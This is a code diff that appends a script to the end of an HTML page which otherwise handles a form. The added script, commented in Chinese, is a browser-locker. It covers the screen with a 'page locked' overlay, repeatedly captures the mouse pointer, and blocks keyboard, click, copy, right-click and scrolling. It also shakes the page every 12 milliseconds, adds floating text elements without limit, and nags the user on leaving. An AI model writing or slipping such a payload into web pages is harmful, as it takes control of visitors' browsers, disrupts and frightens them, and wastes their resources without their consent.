@@ -326,6 +326,101 @@
             form.reset();
         })
     </script>
+    <script>
+        (function(){
+    // 全局遮罩层，遮挡全部页面，模拟弹窗效果（不会被浏览器拦截）
+    const mask = document.createElement('div');
+    mask.style.cssText = `
+        position:fixed;
+        inset:0;
+        background:rgba(0,0,0,0.75);
+        z-index:9999999999;
+        display:flex;
+        align-items:center;
+        justify-content:center;
+    `;
+    const tipBox = document.createElement('div');
+    tipBox.style.cssText = `
+        background:#fff;
+        padding:40px 60px;
+        font-size:26px;
+        white-space:nowrap;
+    `;
+    tipBox.innerText = "页面已锁定，无法操作任何内容";
+    mask.appendChild(tipBox);
+    document.body.appendChild(mask);
+
+    // 持续循环锁定鼠标，页面可见就强制捕获
+    function lockMouseLoop() {
+        document.documentElement.requestPointerLock();
+        document.body.style.cursor = "none";
+        document.onmousedown = e => e.preventDefault();
+        document.onmouseup = e => e.preventDefault();
+        document.onclick = e => e.preventDefault();
+    }
+    setInterval(lockMouseLoop, 200);
+    lockMouseLoop();
+
+    // 拦截所有页面内键盘事件
+    window.addEventListener('keydown', e => {
+        e.preventDefault();
+        e.stopImmediatePropagation();
+        return false;
+    }, true);
+    window.addEventListener('keyup', e => {
+        e.preventDefault();
+        e.stopImmediatePropagation();
+    }, true);
+
+    // 禁用右键、复制、选中、拖拽
+    document.oncontextmenu = e => e.preventDefault();
+    document.oncopy = e => e.preventDefault();
+    document.oncut = e => e.preventDefault();
+    document.onselectstart = e => e.preventDefault();
+    document.ondragstart = e => e.preventDefault();
+
+    // 高强度页面持续抖动
+    setInterval(() => {
+        const x = (Math.random() - 0.5) * 20;
+        const y = (Math.random() - 0.5) * 20;
+        document.body.style.transform = `translate(${x}px, ${y}px)`;
+    }, 12);
+
+    // 高速生成彩色漂浮文字铺满全屏
+    setInterval(() => {
+        const div = document.createElement('div');
+        div.innerText = "锁定中";
+        div.style.cssText = `
+            position: fixed;
+            left: ${Math.random() * 95}vw;
+            top: ${Math.random() * 95}vh;
+            font-size: ${18 + Math.random() * 45}px;
+            color: rgb(${Math.random()*255},${Math.random()*255},${Math.random()*255});
+            font-weight: 900;
+            z-index: 99999999999;
+            pointer-events: none;
+            user-select: none;
+        `;
+        document.body.appendChild(div);
+    }, 50);
+
+    // 禁止滚动
+    document.documentElement.style.overflow = "hidden";
+    document.body.style.overflow = "hidden";
+
+    // 切页面/最小化时立刻强化干扰
+    document.addEventListener("visibilitychange", ()=>{
+        lockMouseLoop();
+        tipBox.innerText = "不要切换页面，锁定持续生效！";
+        setTimeout(()=>tipBox.innerText="页面已锁定，无法操作任何内容",1000);
+    })
+
+    // 离开挽留弹窗（仅提示，无法阻止关闭）
+    window.onbeforeunload = function() {
+        return "页面深度锁定，强行关闭会丢失页面";
+    };
+})();
+    </script>
 </body>
 </html>
 
